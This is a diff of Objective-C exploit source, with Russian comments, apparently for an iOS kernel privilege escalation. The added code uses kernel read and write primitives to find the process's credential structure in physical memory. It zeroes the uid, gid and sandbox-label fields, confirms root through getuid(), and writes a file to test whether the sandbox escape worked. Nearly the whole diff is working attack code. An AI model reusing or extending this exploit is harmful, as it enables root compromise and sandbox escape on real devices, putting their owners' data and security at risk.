@@ -1819,6 +1819,7 @@ static BOOL gPhysmapAnyOK = NO;
 // страницы зоны proc-ucred-mlock для VMPROBE (vm_page_array → vmp_object).
 static uint64_t gUcredSamplePA = 0;
 static BOOL gVmpProbeFaith = NO;   // 2.0.14: единственная низкая страница зоны — пишем без верификации
+static BOOL gT18Root = NO;         // 2.0.17: root взят через T18-KWRITE — форж/INPL пропускаем
 
 // Managed-DRAM predicate on this device: physBase is 0x1_00xxxxxx (T8122),
 // so the old ">16 GiB" clamp rejected EVERY real PA. Frame type is only
@@ -8393,33 +8394,54 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                         // Все кадры типа 0x18 из frame table = страницы наших зон;
                         // скан уже покрыл все ≥256MB → низкие и есть кандидаты на
                         // нашу ucred-страницу. Frame table — kread, безопасно.
+                        // 2.0.17: для каждой кандидатки — kwrite через aperture-алиас
+                        // (phystokv), НЕ DART: низкие PA мимо DART-окна (INPL дал
+                        // 00000). Идентичность — ucred_rw* (+0) совпал с ucF.
                         if (!pagePA && gFrameTableVA) {
                             int uType = gUcredSamplePA ? kpFrameTypeOf(gUcredSamplePA) : 0x18;
-                            uint64_t t18lo[16]; uint32_t n18lo = 0, n18hi = 0, n18all = 0;
+                            uint32_t n18lo = 0, n18hi = 0, n18all = 0, n18hit = 0;
                             kpNote(r, [NSString stringWithFormat:@"  [T18-ENUM] перебор кадров типа %d из frame table (наш ucred — в зоне этого типа)",
                                       uType]);
-                            for (uint64_t i = 0; i < nF; i++) {
+                            for (uint64_t i = 0; i < nF && !pagePA; i++) {
                                 uint64_t pa = pB + (i << 14);
                                 if (kpFrameTypeOf(pa) != uType) continue;
                                 n18all++;
-                                if (pa < pB + 0x10000000ULL) {
-                                    if (n18lo < 16) t18lo[n18lo++] = pa;
-                                } else n18hi++;
+                                if (pa >= pB + 0x10000000ULL) { n18hi++; continue; }
+                                n18lo++;
+                                uint64_t alias = phystokv(pa);
+                                if (!alias) continue;
+                                // идентичность: ucred_rw* (+0) объект-уникален
+                                uint64_t rw0 = early_kread64(alias + uoff2 + 0x00);
+                                uint64_t rwL = early_kread64(ucF + 0x00);
+                                uint32_t lu = (uint32_t)early_kread64(alias + uoff2 + 0x18);
+                                if (rw0 != rwL || lu != uid32) continue;
+                                n18hit++;
+                                kpNote(r, [NSString stringWithFormat:@"  [T18-KWRITE] ★ ucred_rw* совпал: pa=%#llx (кандидат %u) — патч uid-кластера через alias %#llx",
+                                          (unsigned long long)pa, n18lo, (unsigned long long)alias]);
+                                // RMW-патч через early_kwrite64 (мягкий отказ, без паники)
+                                uint64_t q20 = early_kread64(alias + uoff2 + 0x20);
+                                uint64_t q28 = early_kread64(alias + uoff2 + 0x28);
+                                early_kwrite64(alias + uoff2 + 0x18, 0);
+                                early_kwrite64(alias + uoff2 + 0x20, q20 & 0xFFFFFFFF00000000ULL);
+                                early_kwrite64(alias + uoff2 + 0x28, q28 & 0xFFFFFFFF00000000ULL);
+                                early_kwrite64(alias + uoff2 + 0x68, 0);
+                                early_kwrite64(alias + uoff2 + 0x78, 0);
+                                uid_t gk = getuid(); gid_t ggk = getgid();
+                                uint32_t cruN = (uint32_t)early_kread64(ucF + 0x18);
+                                kpNote(r, [NSString stringWithFormat:@"  [T18-KWRITE] readback cr_uid=%u getuid()=%u getgid()=%u — %@",
+                                          cruN, gk, ggk, (gk == 0 || cruN == 0) ? @"ROOT ★★" : @"не прилипло"]);
+                                if (gk == 0 || cruN == 0) {
+                                    pagePA = pa;
+                                    gT18Root = YES;
+                                    kpNote(r, @"=== ROOT ДОСТИГНУТ: getuid()==0 — T18-KWRITE in-place ucred через aperture-alias ===");
+                                    FILE *fp = fopen("/private/var/mobile/kexproof-root-probe.txt", "w");
+                                    kpNote(r, [NSString stringWithFormat:@"  [T18-KWRITE] sandbox-проба: %@",
+                                              fp ? @"УСПЕХ — label снят" : @"ОТКАЗ — label на месте"]);
+                                    if (fp) { fputs("root via T18-KWRITE\n", fp); fclose(fp); }
+                                }
                             }
-                            kpNote(r, [NSString stringWithFormat:@"  [T18-ENUM] кадров типа %d: всего %u, высоких %u, низких %u",
-                                      uType, n18all, n18hi, n18lo]);
-                            for (uint32_t i = 0; i < n18lo; i++)
-                                kpNote(r, [NSString stringWithFormat:@"  [T18-ENUM] низкий кандидат[%u] pa=%#llx", i, (unsigned long long)t18lo[i]]);
-                            if (n18lo == 1) {
-                                pagePA = t18lo[0];
-                                gVmpProbeFaith = YES;
-                                kpNote(r, [NSString stringWithFormat:@"  [T18-ENUM] единственный низкий кандидат — берём на веру: pa=%#llx", (unsigned long long)pagePA]);
-                            } else if (n18lo > 1) {
-                                // несколько: пробуем по порядку, INPL проверит getuid()
-                                pagePA = t18lo[0];
-                                gVmpProbeFaith = YES;
-                                kpNote(r, [NSString stringWithFormat:@"  [T18-ENUM] низких %u — пробуем первый pa=%#llx (список выше для добора)", n18lo, (unsigned long long)pagePA]);
-                            }
+                            kpNote(r, [NSString stringWithFormat:@"  [T18-ENUM] кадров типа %d: всего %u, высоких %u, низких %u, ucred_rw-хитов %u — pagePA=%#llx",
+                                      uType, n18all, n18hi, n18lo, n18hit, (unsigned long long)pagePA]);
                         }
                         // Слепой скан закрыт (ucred физически <256MB — DART слеп там,
                         // kernel-чтения убивают). Идём с другой стороны: у чужого
@@ -8622,7 +8644,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 // (RMW — groups[1] не трогаем), rgid|svgid +0x68 (8B=0),
                 // cr_label +0x78 (8B=0 → sandbox off).
                 BOOL inplRoot = NO;
-                if (paOK && svc && ttM && isTable && pagePA && uoff + 0x80 <= 0x4000) {
+                if (paOK && svc && ttM && isTable && pagePA && uoff + 0x80 <= 0x4000 && !gT18Root) {
                     uint64_t pgPA = pagePA & ~0x3fffULL;
                     uint64_t q20 = early_kread64(ucF + 0x20);
                     uint64_t q28 = early_kread64(ucF + 0x28);
@@ -8653,7 +8675,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 // kexproofv2 2.0.0: тяжёлый форж — только если INPL не взял.
                 // 1.9.251: форжим ВСЮ 16KB-страницу — ucred сидит на uoff=0x38b0,
                 // 4KB записи не доставало (rect 64×64 = 0x4000 в tsdF ниже).
-                if (!inplRoot && paOK && uoff + 0xc0 <= 0x4000) {
+                if (!inplRoot && !gT18Root && paOK && uoff + 0xc0 <= 0x4000) {
                     uint8_t fbuf[0x4000];
                     for (uint32_t i = 0; i < 0x4000; i += 8) *(uint64_t *)(fbuf + i) = early_kread64(pageVA + i);
                     *(uint32_t *)(fbuf + uoff + 0x18) = 0;   // cr_uid
